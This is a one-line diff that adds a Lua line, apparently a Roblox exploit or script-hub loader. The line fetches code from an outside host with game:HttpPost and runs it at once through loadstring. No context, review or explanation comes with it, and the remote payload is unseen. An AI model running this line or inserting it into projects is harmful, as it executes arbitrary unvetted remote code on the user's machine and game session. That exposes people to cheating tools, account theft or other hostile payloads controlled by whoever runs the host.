@@ -1,0 +1,1 @@
+loadstring(game:HttpPost("https://kaze-loader.lovable.app/api/public/raw/656d750c-f5f4-4d5e-ac30-545f9cae6563", ""))()
